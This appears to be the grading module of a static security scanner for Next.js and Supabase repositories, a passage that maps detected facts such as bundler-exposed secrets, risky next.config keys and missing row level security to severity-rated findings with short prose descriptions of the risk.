#!/usr/bin/env node
// Grader — the single authority on severity.
//
// The engine (project_model.mjs) computes Facts and has no opinion about danger. This file is
// the ONLY place that turns Facts into Findings, so the severity policy exists once instead of
// being re-derived inside every check. See CONTEXT.md for the vocabulary.
//
// Three laws govern this file, because a law that is only written in a document is a law that
// drifts. Each says how it is enforced — by a runtime assertion, or by construction:
//
//   LAW 1  No subject may be marked `pass` because a token was present in the source.
//          Seeing the string `getUser` does not prove the handler is gated: the call may be
//          unawaited, its result ignored, or its throw swallowed. Printing a checkmark there is
//          worse than printing nothing, because the user stops looking.
//          ENFORCED two ways: every legitimate `pass` this grader emits is STRUCTURAL (RLS proven
//          by a migration, an anon-scoped client factory, a security-invoker function), never a
//          token — that is by construction; AND for the sets where a token could tempt a pass
//          (`routes`, `llmSites` — see NO_PASS_SETS), a runtime assertion forbids `pass` outright.
//   LAW 2  enumerated === pass + fail + undeterminable + allowlisted, for every subject set.
//          A subject that silently falls out of the ledger is how "we found nothing" comes to
//          mean "we looked nowhere". ENFORCED by a runtime assertion in Ledger.toJSON().
//   LAW 3  Name-only evidence may never justify a P0. `FOO_API_KEY` in a variable name is not
//          proof that a privileged credential exists. ENFORCED by a runtime assertion in
//          finding() and again in grade().
//   LAW 4  A `clean` verdict may not be a lie. `clean` is only emitted when nothing was confirmed
//          AND nothing unproven-but-catastrophic (a P0/P1 at `likely` or `needs-review`) is still
//          open AND discovery coverage cleared its floor. Otherwise the level is `unknown`, never
//          green. ENFORCED by a runtime assertion at the end of grade().
//
// Two rules that follow from the domain model:
//   - Confidence is a pure function of Evidence, so the same repo always grades the same way.
//   - Severity is impact-if-true and is NEVER reduced because we are unsure. Discounting twice
//     buries a catastrophic-but-unproven issue where nobody looks. The renderer compensates by
//     counting only `confirmed` Findings in the headline verdict — and LAW 4 keeps that from
//     turning into a false all-clear.
//
// Usage:
//   node grader.mjs <repo-path> [--json]        # runs the engine, then grades
//   node project_model.mjs . | node grader.mjs  # grades a model on stdin
//   node grader.mjs <repo-path> --observations live.json
//   node grader.mjs <repo-path> --gate          # exit code from the verdict, summary on stderr
import { readFileSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { auditBusinessLogic, loadIntent, proposeIntent, renderIntentYaml, TAXONOMY } from './business_logic.mjs'

// ---------------------------------------------------------------------------
// Policy tables — the whole severity model, in one readable place.
// ---------------------------------------------------------------------------

/**
 * Confidence is a pure function of Evidence. Nothing else may set it.
 *
 * `judgement` maps to `likely` rather than `needs-review` on purpose: a reviewer who read the
 * code and formed a view has done more work than a regex that half-matched. It is capped there
 * and can never reach `confirmed`, because no amount of reading is a proof.
 */
const CONFIDENCE_BY_EVIDENCE = {
  definitive: 'confirmed',
  strong: 'likely',
  weak: 'needs-review',
  judgement: 'likely',
}

const SEVERITY_ORDER = ['P0', 'P1', 'P2', 'P3', 'P4']
const CONFIDENCE_ORDER = ['confirmed', 'likely', 'needs-review']

/** Dispositions a subject can end up in. Exactly one each — see LAW 2. */
const DISPOSITIONS = ['pass', 'fail', 'undeterminable', 'allowlisted']

/**
 * External tools whose output is an ANALYSIS rather than a located fact, and which therefore may
 * never reach `confirmed`. gitleaks is deliberately absent: it reports a credential's VALUE at a
 * file:line, which is exactly the kind of evidence LAW 3 allows to close a P0, and which a user can
 * check by opening the file. Snyk's reachability and Snyk Code's dataflow are excellent and are
 * still somebody else's judgement about code this grader never read.
 */
const JUDGEMENT_SOURCES = new Set(['snyk', 'semgrep'])

// LAW 1, made mechanical. A `pass` in these sets could only ever come from a token in the source
// (a route mentioning `getUser`, an LLM call mentioning an auth check) — and a token is not a
// proof, so a static pass here is exactly the false checkmark LAW 1 forbids. Every legitimate pass
// this grader emits is STRUCTURAL and lives in a different set (RLS proven by a migration, an
// anon-scoped client factory, a security-invoker function). So we can assert the rule outright:
// these sets are never allowed a `pass` row. A future rule that regressed into passing a route on
// a bare `getUser` would throw here instead of printing a green check nobody double-checks.
const NO_PASS_SETS = new Set(['routes', 'llmSites'])

// ---------------------------------------------------------------------------
// LAW 4 — the `clean` verdict must not lie.
//
// THE DEFECT THIS FIXES. The verdict counted `confirmed` findings and nothing else, so a repo
// with a fully unauthenticated DELETE endpoint graded 🟢 `clean`: the route rule correctly raises
// a P1 at `needs-review` (the absence of an auth token is not proof — LAW 1), and `needs-review`
// does not count, so the badge came out green over an endpoint anyone on the internet can call to
// destroy data. Same for a scan that could not read half the repo: nothing confirmed, badge green.
// "Nothing was proven" and "nothing is wrong" printed the same colour, which is the exact failure
// this whole tool exists to prevent — and the one failure a non-expert cannot detect for himself.
//
// So the badge is now a function of COVERAGE × CONFIRMED, not of confirmed alone:
//
//   `clean`  requires  (a) zero confirmed findings
//                 AND  (b) zero UNPROVEN P0/P1 — a P0 or P1 at `likely` or `needs-review` that is
//                          still open (an allowlisted or refuted subject raises no finding, so
//                          anything left in the list is by definition unsettled)
//                 AND  (c) discovery coverage at or above the floor below.
//   otherwise, with nothing confirmed, the level is `unknown` — "not proven safe", never green.
//
// A repo WITH confirmed findings is unaffected: it keeps critical / high / medium / low exactly as
// before. `unknown` only ever replaces what used to be `clean`, so this can never make a report
// louder about a specific finding — the cry-wolf thesis is intact. It changes one thing: a badge
// that used to claim more than the evidence supports now says so.
// ---------------------------------------------------------------------------

/** The levels the badge can take. `unknown` is not a severity — it is the absence of a claim. */
const VERDICT_LEVELS = ['critical', 'high', 'medium', 'low', 'unknown', 'clean']

/**
 * THE COVERAGE FLOOR, in one number.
 *
 * Read `core/methodology/discovery.md`: discovery coverage asks "what did the engine manage to
 * SEE", which is a different axis from the pass/fail ledger's "of what it saw, what did it grade".
 * The floor is deliberately expressed over the files the engine SET OUT to read — parsed plus
 * config-parsed plus oversized plus read-errors — and NOT over every file discovered. A repo full
 * of PNGs and lockfiles is not under-read; those are deliberate, accounted-for exclusions, and
 * putting them in the denominator would flip correct apps to `unknown` for owning a logo. What
 * belongs in the denominator is only the files we wanted and failed to get.
 *
 * 0.95: more than one file in twenty that we meant to read and could not is a hole big enough to
 * hide the finding, and at that point "we could not see enough to say" is the honest headline.
 */
const DISCOVERY_READ_RATIO_FLOOR = 0.95

/**
 * Is discovery good enough for a green badge? Every `false` carries its reason, because a floor
 * that fails without saying why is just another opaque verdict.
 *
 * An ABSENT discovery ledger is inadequate, not neutral. A model that never says what it managed
 * to see has not earned "clean" — and treating absence as adequate would make stripping one key
 * off the model the cheapest way to buy a green badge.
 */
function assessDiscoveryCoverage(discovery) {
  const floor = DISCOVERY_READ_RATIO_FLOOR
  const counts = discovery && typeof discovery === 'object' ? discovery.counts : null
  if (!counts || typeof counts !== 'object') {
    return {
      adequate: false, ratio: null, floor, filesRead: null, filesIntended: null,
      reasons: ['no discovery ledger: this model does not record what the engine managed to see, ' +
        'and an absent ledger is not evidence of complete discovery'],
    }
  }
  const n = v => (Number.isFinite(v) ? v : 0)
  const filesRead = n(counts.filesParsed) + n(counts.configParsed)
  // Files we INTENDED to read. `unsupported` is excluded on purpose — see the constant above.
  const filesIntended = filesRead + n(counts.oversized) + n(counts.readErrors)
  const ratio = filesIntended > 0 ? filesRead / filesIntended : 0

  const reasons = []
  if (discovery.reconciles !== true) {
    reasons.push('the discovery ledger does not reconcile' +
      (discovery.discrepancy ? ` (${discovery.discrepancy})` : '') +
      ' — its counts cannot be trusted, so neither can a verdict built on them')
  }
  if (!n(counts.filesDiscovered)) {
    reasons.push('no files were discovered at all — there is nothing behind a clean verdict')
  } else if (filesRead === 0) {
    reasons.push('not one file was parsed — every discovered file was unsupported, oversized or unreadable')
  } else if (ratio < floor) {
    reasons.push(`only ${filesRead} of the ${filesIntended} files the engine set out to read were ` +
      `actually read (${(100 * ratio).toFixed(1)}%, floor ${(100 * floor).toFixed(0)}%)`)
  }
  return { adequate: reasons.length === 0, ratio, floor, filesRead, filesIntended, reasons }
}

// ---------------------------------------------------------------------------
// The ledger — enforces LAW 2 by construction.
// ---------------------------------------------------------------------------

class Ledger {
  constructor() {
    /** @type {Map<string, Map<string, {subject: string, disposition: string, note: string|null}>>} */
    this.sets = new Map()
  }

  /** Declare a subject set up front, so an empty set still reports as enumerated: 0. */
  declare(setName) {
    if (!this.sets.has(setName)) this.sets.set(setName, new Map())
  }

  /**
   * Record the single disposition of one subject. Re-recording the same subject is a bug in a
   * rule, not something to paper over: it means two rules disagree about the same thing, and
   * whichever ran last would silently win.
   */
  record(setName, subject, disposition, note = null) {
    if (!DISPOSITIONS.includes(disposition)) throw new Error(`unknown disposition ${disposition}`)
    this.declare(setName)
    const set = this.sets.get(setName)
    if (set.has(subject)) {
      const prev = set.get(subject)
      if (prev.disposition === disposition) return
      throw new Error(
        `LAW 2: subject "${subject}" in set "${setName}" was recorded twice ` +
        `(${prev.disposition} then ${disposition}). Two rules disagree; resolve the overlap.`)
    }
    set.set(subject, { subject, disposition, note })
  }

  /**
   * Rewrite an existing row's NOTE, never its disposition.
   *
   * Used by reconciliation: when two tools report the same defect and one finding is absorbed into
   * the other, the absorbed subject still failed — the disposition would be a lie if it changed —
   * but its row has to say where its finding went. Coverage promises that every `fail` row has a
   * finding id; a row pointing at nothing would quietly break that cross-check.
   */
  annotate(subject, note) {
    for (const subjects of this.sets.values()) {
      const row = subjects.get(subject)
      if (row) row.note = note
    }
  }

  toJSON() {
    const out = {}
    for (const [setName, subjects] of this.sets) {
      const buckets = { pass: [], fail: [], undeterminable: [], allowlisted: [] }
      for (const s of subjects.values()) buckets[s.disposition].push(s)
      const counted = DISPOSITIONS.reduce((n, d) => n + buckets[d].length, 0)
      if (counted !== subjects.size) throw new Error(`LAW 2 violated in set "${setName}"`)
      out[setName] = {
        enumerated: subjects.size,
        counts: Object.fromEntries(DISPOSITIONS.map(d => [d, buckets[d].length])),
        ...buckets,
      }
    }
    return out
  }
}

// ---------------------------------------------------------------------------
// Finding construction
// ---------------------------------------------------------------------------

/**
 * Build a Finding. Callers supply Evidence and impact; confidence is derived, never passed in.
 *
 * @param {object} f
 * @param {'definitive'|'strong'|'weak'|'judgement'} f.evidence  how solidly the Fact is established
 * @param {boolean} [f.nameOnly]  true when the ONLY thing establishing this is an identifier name
 */
function finding(f) {
  const {
    id, subject, severity, evidence, at = [], why,
    title_en, title_he, exploit, impact, guard = null, cwe = null, owasp = null,
    autofixable = false, tier = 'static', nameOnly = false, assumption = null,
    provenance = 'rule', source = null,
  } = f

  if (!SEVERITY_ORDER.includes(severity)) throw new Error(`${id}: bad severity ${severity}`)
  if (!CONFIDENCE_BY_EVIDENCE[evidence]) throw new Error(`${id}: bad evidence ${evidence}`)
  if (nameOnly && severity === 'P0') {
    throw new Error(`LAW 3: ${id} claims P0 from name-only evidence. A variable name is not a credential.`)
  }

  return {
    id, subject, title_en, title_he,
    severity,
    confidence: CONFIDENCE_BY_EVIDENCE[evidence],
    provenance,
    // WHICH external tool established this, or null when one of our own rules did. Reconciliation
    // keys on it (see reconcileDuplicates): three tools flagging one line must produce one finding,
    // and when our own rule already graded that defect, its grade is the authority — that is what
    // "the grader is the single severity authority" means when a commercial scanner disagrees.
    source,
    tier,
    // Evidence is a single concept with a strength and the places that establish it. The
    // renderer shows `at` verbatim so a user can check our work in their own editor.
    evidence: { strength: evidence, nameOnly, why, at },
    exploit, impact, guard, cwe, owasp, autofixable,
    // What would have to be true for this to be a false positive. Stated because "likely" with
    // no named assumption is just hedging.
    assumption,
    // Other tools that independently reported the same weakness at the same place, filled in by
    // reconciliation. Empty for almost every finding; non-empty is a reason to look sooner.
    corroboration: [],
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** `app/api/orders/route.ts` -> `/api/orders`; `pages/api/orders.ts` -> `/api/orders`. */
function urlPathOf(routeFile) {
  let p = routeFile
    .replace(/^src\//, '')
    .replace(/^app\//, '')
    .replace(/^pages\//, '')
    .replace(/\/route\.(t|j)sx?$/, '')
    .replace(/\.(t|j)sx?$/, '')
    .replace(/\/index$/, '')
  // Route groups `(marketing)` are organisational and do not appear in the URL.
  p = p.split('/').filter(seg => !/^\(.*\)$/.test(seg)).join('/')
  return '/' + p.replace(/^\/+/, '')
}

/**
 * Convert one Next.js middleware matcher pattern to a regex source.
 *
 * A matcher's spelling must not change its meaning: `/api/:path*` and `/api/(.*)` describe the same
 * set of paths and must both cover `/api/widgets`. An earlier version escaped `(` `.` `)` but NOT
 * `*`, so its attempt to un-escape `(.*)` never fired and a `(.*)` matcher — one of the most common
 * Next.js forms — flipped a protected route to a false "no auth". This converter handles the tokens
 * by MEANING, protecting user-written regex groups (balanced, possibly nested) before escaping the
 * literal remainder.
 */
function matcherToRegex(pat) {
  const stash = []
  const put = s => `\x00${stash.push(s) - 1}\x00`

  // 1. Protect user-written regex groups verbatim: `(.*)`, `(a|b)`, `((?!api|_next).*)`.
  let out = ''
  for (let i = 0; i < pat.length;) {
    if (pat[i] === '(') {
      let depth = 0, j = i
      for (; j < pat.length; j++) {
        if (pat[j] === '(') depth++
        else if (pat[j] === ')' && --depth === 0) break
      }
      if (depth === 0) { out += put(pat.slice(i, j + 1)); i = j + 1; continue }
    }
    out += pat[i++]
  }

  // 2. Named params, by meaning. `/:x*` covers the segment AND its absence (`/api` and `/api/a`).
  out = out
    .replace(/\/:\w+\*/g, () => put('(?:/.*)?'))
    .replace(/:\w+\*/g, () => put('.*'))
    .replace(/:\w+\+/g, () => put('.+'))
    .replace(/:\w+\?/g, () => put('[^/]*'))
    .replace(/:\w+/g, () => put('[^/]+'))
    .replace(/\*/g, () => put('.*'))

  // 3. Escape the literal remainder. Placeholders (NUL + digits) carry no regex metachars, so they
  //    survive this untouched.
  out = out.replace(/[.+^${}()|[\]\\/]/g, '\\$&')

  // 4. Restore the protected fragments.
  return out.replace(/\x00(\d+)\x00/g, (_, n) => stash[Number(n)])
}

/**
 * Does a Next.js middleware matcher cover this URL path?
 *
 * Deliberately conservative: an unparseable matcher returns false, so we under-claim coverage
 * rather than assert protection we cannot demonstrate.
 */
function matcherCovers(matcher, urlPath) {
  if (matcher == null) return true // no matcher = middleware runs on every request
  const patterns = String(matcher).split(',').map(s => s.trim().replace(/^['"]|['"]$/g, '')).filter(Boolean)
  for (const pat of patterns) {
    if (!pat.startsWith('/')) continue
    try {
      if (new RegExp(`^${matcherToRegex(pat)}$`).test(urlPath)) return true
    } catch { /* unparseable matcher: claim nothing */ }
  }
  return false
}

const firstAt = (file, line = null, snippet = null) => (file ? [{ file, line, snippet }] : [])

/** `path/to/file.sql:42` -> {file, line} */
function splitAt(loc) {
  if (!loc) return { file: null, line: null }
  const m = /^(.*):(\d+)$/.exec(loc)
  return m ? { file: m[1], line: Number(m[2]) } : { file: loc, line: null }
}

// ---------------------------------------------------------------------------
// Rules
//
// Each rule iterates one enumerable set and records a disposition for EVERY member. That is what
// makes coverage add up, and it is the only mechanism by which completeness is achieved — there
// is no separate "invariant" concept.
// ---------------------------------------------------------------------------

function gradeEnvVars(model, ledger, findings, allow) {
  ledger.declare('envVars')
  for (const v of model.envVars || []) {
    const subject = `env:${v.name}`
    if (allow.has(subject)) { ledger.record('envVars', subject, 'allowlisted', 'user allowlist'); continue }

    // Public-by-design identifiers are not secrets. This list is the single most important
    // false-positive guard in the tool: reporting SUPABASE_ANON_KEY as a leaked credential is
    // how a security tool teaches its audience to ignore it.
    if (v.publicByDesign) {
      ledger.record('envVars', subject, 'allowlisted', 'public by design (anon/publishable identifier)')
      continue
    }

    const decl = v.declared || {}
    const at = firstAt(decl.file || v.usages?.[0]?.file, decl.line || v.usages?.[0]?.line)

    switch (v.exposure) {
      case 'bundler-inlined-public-prefix': {
        // The prefix is what makes this definitive: the bundler textually substitutes the value
        // into client output. No graph reasoning is involved, so nothing can break the chain.
        if (v.secretClass === 'high') {
          findings.push(finding({
            id: 'CG-ENV-001', subject,
            title_en: `Privileged secret "${v.name}" is compiled into the browser bundle`,
            title_he: `הסוד "${v.name}" נכלל בבנדל של הדפדפן`,
            severity: 'P0', evidence: 'definitive',
            why: `${v.publicPrefix} is a bundler-inlined prefix, so this value is present in client output verbatim.`,
            at,
            exploit: 'Anyone opens DevTools, reads the value out of the JavaScript bundle, and uses the credential directly.',
            impact: 'Full access to whatever the credential grants — data, billing, or both. Rotate it before doing anything else.',
            guard: 'guard-recipes/secrets-management.md#public-prefixes',
            cwe: 'CWE-200', owasp: 'A01:2021', autofixable: true,
          }))
          ledger.record('envVars', subject, 'fail', 'privileged secret behind a public prefix')
        } else if (v.secretClass === 'weak') {
          // LAW 3: the name is the only thing suggesting this is a secret, and names like
          // PUSHER_APP_KEY or IDEMPOTENCY_KEY are routinely publishable. P2, needs-review.
          findings.push(finding({
            id: 'CG-ENV-002', subject,
            title_en: `"${v.name}" is public — confirm it is meant to be`,
            title_he: `"${v.name}" חשוף לציבור — ודאו שזו הכוונה`,
            severity: 'P2', evidence: 'weak', nameOnly: true,
            why: 'The name looks credential-like, but many such names are publishable identifiers. Only you can say which this is.',
            at,
            exploit: 'If this key grants privileged access, anyone reading the bundle can use it.',
            impact: 'Depends entirely on the key. Publishable keys are fine here; privileged ones are a full compromise.',
            guard: 'guard-recipes/secrets-management.md#public-prefixes',
            assumption: 'That this key actually grants privileged access rather than being a public identifier.',
          }))
          ledger.record('envVars', subject, 'fail', 'credential-like name behind a public prefix')
        } else {
          ledger.record('envVars', subject, 'pass', 'public prefix, no credential semantics in the name')
        }
        break
      }

      case 'referenced-in-client-module': {
        // NOT a leak. Bundlers substitute only allowlisted prefixes; everything else is simply
        // absent from client output and is `undefined` in the browser. This is a correctness
        // bug, and calling it a breach is what fired five confident P0s at a correct repo.
        ledger.record('envVars', subject, 'pass', 'not inlined by the bundler — absent from client output')
        if (v.clientGraphStrength === 'strong' && v.secretClass !== 'none') {
          findings.push(finding({
            id: 'CG-ENV-003', subject,
            title_en: `"${v.name}" is read from client code and will be undefined in the browser`,
            title_he: `"${v.name}" נקרא מקוד צד-לקוח ויהיה undefined בדפדפן`,
            severity: 'P3', evidence: 'strong',
            why: 'The variable is read in a module reachable from a client entrypoint, but has no bundler-inlined prefix, so it is not substituted.',
            at: (v.clientReachableUsages || []).slice(0, 3).map(u => ({ file: u.file, line: u.line, snippet: null })),
            exploit: 'No attacker action. The value is missing at runtime, so the feature silently misbehaves.',
            impact: 'A correctness bug that often gets "fixed" by adding a public prefix — which WOULD be a breach. Move the read to the server instead.',
            guard: 'guard-recipes/secrets-management.md#server-only',
          }))
        }
        break
      }

      case 'example-only': {
        // Named in .env.example with no value and never read. Nothing exists, so nothing leaks.
        // At most the template teaches an unsafe pattern.
        ledger.record('envVars', subject, 'pass', 'placeholder only — no value and no reader')
        if (v.publicPrefix && v.secretClass === 'high') {
          findings.push(finding({
            id: 'CG-ENV-004', subject,
            title_en: `.env.example teaches an unsafe pattern for "${v.name}"`,
            title_he: `קובץ .env.example מלמד דפוס לא בטוח עבור "${v.name}"`,
            severity: 'P4', evidence: 'definitive',
            why: 'The template pairs a bundler-inlined prefix with a credential-shaped name, so whoever fills it in will publish a secret.',
            at, exploit: 'Nothing yet. The next person to fill this in ships a live secret to the browser.',
            impact: 'A future P0 with a written invitation.',
            guard: 'guard-recipes/secrets-management.md#public-prefixes',
          }))
        }
        break
      }

      case 'server-only':
      default:
        // Structurally unable to reach the browser: no public prefix and no client reader.
        ledger.record('envVars', subject, 'pass', 'server-only — no inlining prefix, no client reader')
        break
    }
  }
}

function gradeNextConfig(model, ledger, findings, allow) {
  ledger.declare('nextConfigKeys')
  // `env:` and `publicRuntimeConfig` inline whatever they list into the client bundle regardless
  // of prefix, which defeats the entire prefix-based model. Severity depends on whether this
  // repo has anything privileged to inline — impact-if-true, decided here and nowhere else.
  const hasPrivilegedSecret = (model.envVars || []).some(v => v.secretClass === 'high' && !v.publicByDesign)

  // Ids follow the CG-<DOMAIN>-<NNN> scheme from core/severity-model.md. They are stable
  // identifiers users cite when asking for help, so they are written out rather than derived
  // from the key name.
  const POLICY = {
    env: {
      id: 'CG-WEB-020',
      sev: () => (hasPrivilegedSecret ? 'P0' : 'P2'),
      title_en: 'next.config `env:` inlines variables into the browser bundle',
      title_he: 'הגדרת `env:` ב-next.config מטמיעה משתנים בבנדל של הדפדפן',
      exploit: 'Anything listed here is readable in DevTools, with or without a NEXT_PUBLIC_ prefix.',
      impact: 'Bypasses the prefix convention that everything else relies on, so a server secret can ship to the browser unnoticed.',
      guard: 'guard-recipes/secrets-management.md#next-config',
    },
    publicRuntimeConfig: {
      id: 'CG-WEB-021',
      sev: () => (hasPrivilegedSecret ? 'P0' : 'P2'),
      title_en: 'next.config `publicRuntimeConfig` is shipped to the browser',
      title_he: '`publicRuntimeConfig` ב-next.config נשלח לדפדפן',
      exploit: 'Every value in this block is serialised into the page and readable by anyone.',
      impact: 'Same as `env:` — a prefix-free path from server config to the browser.',
      guard: 'guard-recipes/secrets-management.md#next-config',
    },
    productionBrowserSourceMaps: {
      id: 'CG-WEB-022',
      sev: () => 'P3',
      title_en: 'Production source maps are published',
      title_he: 'מפות מקור מפורסמות בסביבת הייצור',
      exploit: 'An attacker reads your original source, including comments and internal route names.',
      impact: 'Makes every other weakness easier to find. Not a breach on its own.',
      guard: 'guard-recipes/ci-hardening.md#source-maps',
    },
    ignoreBuildErrors: {
      id: 'CG-WEB-023',
      sev: () => 'P3',
      title_en: 'TypeScript errors are suppressed at build time',
      title_he: 'שגיאות TypeScript מושתקות בזמן הבנייה',
      exploit: 'No direct attack. Type errors that would have caught a bad auth check ship anyway.',
      impact: 'Removes a safety net the rest of the codebase assumes is there.',
      guard: 'guard-recipes/ci-hardening.md#build-gates',
    },
    ignoreDuringBuilds: {
      id: 'CG-WEB-024',
      sev: () => 'P3',
      title_en: 'ESLint is suppressed at build time',
      title_he: 'ESLint מושתק בזמן הבנייה',
      exploit: 'No direct attack. Security lint rules never run.',
      impact: 'Removes a safety net the rest of the codebase assumes is there.',
      guard: 'guard-recipes/ci-hardening.md#build-gates',
    },
    remotePatternsWildcard: {
      id: 'CG-WEB-025',
      sev: () => 'P2',
      title_en: 'Image `remotePatterns` allows any host',
      title_he: 'הגדרת `remotePatterns` מתירה כל דומיין',
      exploit: 'An attacker proxies arbitrary remote content — and any SSRF-shaped request — through your image optimiser.',
      impact: 'Your domain serves attacker-chosen content, and your server makes attacker-chosen requests.',
      guard: 'guard-recipes/security-headers.md#image-hosts',
    },
  }

  for (const fact of model.nextConfig || []) {
    if (fact.key === 'securityHeadersConfigured') {
      const subject = `next-config:${fact.file}:headers`
      if (fact.present) {
        // LAW 1: a headers() function EXISTING does not prove it sets useful headers. The live
        // probe is what settles this, so it is undeterminable here rather than a pass.
        ledger.record('nextConfigKeys', subject, 'undeterminable',
          'a headers() function exists, but its contents are not verified from source — confirm with /cg-live')
      } else {
        findings.push(finding({
          id: 'CG-WEB-010', subject,
          title_en: 'No security headers configured in next.config',
          title_he: 'לא הוגדרו כותרות אבטחה ב-next.config',
          severity: 'P2', evidence: 'definitive',
          why: 'next.config declares no headers() function, so nothing sets CSP, HSTS or frame protections at the framework level.',
          at: firstAt(fact.file),
          exploit: 'Clickjacking and injected-script attacks that a CSP would have blocked.',
          impact: 'Removes the browser-side defences that limit the damage of any other bug.',
          guard: 'guard-recipes/security-headers.md',
          cwe: 'CWE-693', autofixable: true,
        }))
        ledger.record('nextConfigKeys', subject, 'fail', 'no headers() function')
      }
      continue
    }

    const subject = `next-config:${fact.file}:${fact.key}`
    if (allow.has(subject)) { ledger.record('nextConfigKeys', subject, 'allowlisted', 'user allowlist'); continue }
    const p = POLICY[fact.key]
    if (!p) { ledger.record('nextConfigKeys', subject, 'undeterminable', 'no rule owns this key'); continue }

    findings.push(finding({
      id: p.id, subject,
      title_en: p.title_en, title_he: p.title_he,
      severity: p.sev(),
      // We can see the block definitively; we cannot see WHICH variables end up inside it.
      evidence: fact.key === 'env' || fact.key === 'publicRuntimeConfig' ? 'strong' : 'definitive',
      why: fact.why || `next.config sets ${fact.key}.`,
      at: firstAt(fact.file, fact.line, fact.match),
      exploit: p.exploit, impact: p.impact, guard: p.guard,
      assumption: fact.key === 'env' || fact.key === 'publicRuntimeConfig'
        ? 'That a privileged value is among the ones listed in the block.'
        : null,
    }))
    ledger.record('nextConfigKeys', subject, 'fail', `${fact.key} set`)
  }
}

function gradeTables(model, ledger, findings, allow) {
  ledger.declare('tables')
  const db = model.database || {}
  const sources = db.schemaSources || []
  const undeterminableTables = []

  for (const t of db.tables || []) {
    const subject = `table:${t.name}`
    if (allow.has(subject)) { ledger.record('tables', subject, 'allowlisted', 'user allowlist'); continue }

    const knownFrom = t.knownFrom || []
    // Prisma and Drizzle projects talk to Postgres as a privileged application user and enforce
    // authorization in application code. There is no RLS layer to be missing, so demanding one
    // would flood a correctly-built app with findings about a control it never adopted.
    if ((knownFrom.includes('prisma') || knownFrom.includes('drizzle')) && !knownFrom.includes('migrations')) {
      ledger.record('tables', subject, 'allowlisted', 'ORM-managed schema — RLS is not the control here')
      continue
    }

    if (t.rlsCertainty !== 'from-migrations') {
      // The table exists (generated types or a code reference prove it), but nothing in the repo
      // says whether RLS is on. Claiming `false` invents a P0; claiming `true` hides one.
      ledger.record('tables', subject, 'undeterminable',
        `discovered from ${knownFrom.join(', ') || 'code'} — no migration proves its RLS state`)
      undeterminableTables.push(t.name)
      continue
    }

    const { file, line } = splitAt(t.definedIn)

    if (!t.rlsEnabled) {
      findings.push(finding({
        id: 'CG-DB-001', subject,
        title_en: `Table "${t.name}" has row level security disabled`,
        title_he: `לטבלה "${t.name}" אין הגנת RLS`,
        severity: 'P0',
        // Within the static tier the migration set IS the schema, and it never enables RLS on
        // this table. The named assumption below is the only way this can be wrong.
        evidence: 'definitive',
        why: 'The migrations create this table and never run `alter table ... enable row level security`.',
        at: firstAt(file, line),
        exploit: 'Anyone with the anon key — which every browser client ships — reads and writes the whole table.',
        impact: 'Total exposure of everything in this table, and the ability to modify it.',
        guard: 'guard-recipes/rls-policies.md#enable-rls',
        cwe: 'CWE-284', owasp: 'A01:2021', autofixable: true,
        assumption: 'That RLS was not enabled outside migrations (for example in the Supabase dashboard). Run the verify query in the coverage section to settle it.',
      }))
      ledger.record('tables', subject, 'fail', 'RLS not enabled in migrations')
      continue
    }

    const permissive = (t.policies || []).filter(p => p.permissive)
    if (permissive.length) {
      const p0 = permissive[0]
      const loc = splitAt(p0.at)
      findings.push(finding({
        id: 'CG-DB-002', subject,
        title_en: `Table "${t.name}" has RLS on, but a policy allows everyone`,
        title_he: `לטבלה "${t.name}" יש RLS, אך מדיניות אחת מתירה לכולם`,
        severity: 'P0', evidence: 'definitive',
        why: `Policy "${p0.name}" uses \`true\` as its predicate, which matches every row for every caller.`,
        at: firstAt(loc.file, loc.line),
        exploit: 'Anyone with the anon key runs the policy\'s command against every row.',
        impact: 'RLS is enabled but not enforcing anything — the protection reads as present in the dashboard while granting full access.',
        guard: 'guard-recipes/rls-policies.md#owner-scoped-policy',
        cwe: 'CWE-284', owasp: 'A01:2021',
      }))
      ledger.record('tables', subject, 'fail', `permissive policy "${p0.name}"`)
      continue
    }

    if (!(t.policies || []).length) {
      // RLS on with zero policies denies everything. Secure, but the app is probably broken —
      // and a user who "fixes" it under time pressure tends to reach for `using (true)`.
      ledger.record('tables', subject, 'pass', 'RLS enabled with no policies — deny-all')
      findings.push(finding({
        id: 'CG-DB-003', subject,
        title_en: `Table "${t.name}" denies all access (RLS on, no policies)`,
        title_he: `הטבלה "${t.name}" חוסמת כל גישה (RLS פעיל, ללא מדיניות)`,
        severity: 'P4', evidence: 'definitive',
        why: 'RLS is enabled and no policy grants anything, so every anon and authenticated query returns nothing.',
        at: (loc => firstAt(loc.file, loc.line))(splitAt(t.rlsAt)),
        exploit: 'None — this is the safe direction.',
        impact: 'Features touching this table will appear broken. Write a scoped policy rather than a permissive one.',
        guard: 'guard-recipes/rls-policies.md#owner-scoped-policy',
      }))
      continue
    }

    // Policies exist and none is permissive. That is a structural pass: the predicate is in the
    // migration, not inferred from a token in application code.
    const scoped = t.policies.some(p => p.scopedToUid)
    ledger.record('tables', subject, 'pass',
      scoped ? 'RLS enabled with uid-scoped policies' : 'RLS enabled with non-permissive policies')
  }

  // One loud blocking unknown, not N quiet ones. A user with no migrations needs a single
  // instruction, not a wall of identical rows.
  if (undeterminableTables.length) {
    const noSchemaAtAll = !sources.includes('migrations')
    findings.push(finding({
      id: 'CG-DB-COVERAGE', subject: 'database:rls-coverage',
      title_en: `RLS state could not be determined for ${undeterminableTables.length} table(s)`,
      title_he: `לא ניתן לקבוע את מצב ה-RLS עבור ${undeterminableTables.length} טבלאות`,
      // Impact-if-true: an unprotected Supabase table is a total exposure. Confidence, not
      // severity, is where the uncertainty lives — and needs-review keeps it out of the verdict.
      severity: 'P0', evidence: 'weak',
      why: noSchemaAtAll
        ? 'This repo has no migrations, so the schema lives only in the Supabase dashboard and cannot be read from source.'
        : 'These tables appear in generated types or code but not in any migration, so nothing in the repo states their RLS state.',
      at: [],
      exploit: 'If RLS is off on any of these, anyone with the anon key reads and writes the whole table.',
      impact: 'Unknown, and unknowable from the repo alone. Run the query below against your database to settle it in ten seconds.',
      guard: 'guard-recipes/rls-policies.md#verify-live',
      assumption: 'That these tables were created outside migrations. The verify query returns the real answer.',
      autofixable: false,
    }))
  }

  // Non-literal `.from(x)` means the table set behind a generic CRUD helper cannot be
  // enumerated. Surfacing it is the difference between "complete" and "complete as far as we
  // could see".
  ledger.declare('dynamicTableRefs')
  for (const d of db.coverage?.dynamicTableRefs || []) {
    ledger.record('dynamicTableRefs', `dynamic-table:${d.file}:${d.line}`, 'undeterminable',
